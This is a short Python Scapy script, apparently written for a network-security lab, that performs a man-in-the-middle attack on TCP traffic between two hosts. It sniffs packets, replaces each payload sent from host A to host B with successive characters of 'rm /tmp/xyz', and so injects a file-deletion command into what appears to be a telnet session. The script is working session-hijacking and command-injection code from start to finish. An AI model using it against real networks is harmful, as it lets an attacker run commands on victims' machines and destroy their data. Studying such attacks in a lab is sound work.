#!/usr/bin/env python3
from scapy.all import * 

#This process assumes we have setup the mitm_setup_request.py
#Intercepts and sends characters from "rm /tmp/xyz"

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
malicious = "rm /tmp/xyz\ny\n"
curr_ind = 0

def spoof_pkt(pkt):
	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load
			print(data)
			#newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
			global curr_ind
			newdata = malicious[curr_ind]
			curr_ind += 1
			curr_ind %= len(malicious)
			print("ind: ", curr_ind)
			print(newdata)
			send(newpkt/newdata)
		else:
			send(newpkt)
	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt)

template = 'tcp and (ether src {A} or ether src {B})'
f = template.format(A=MAC_A, B=MAC_B)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
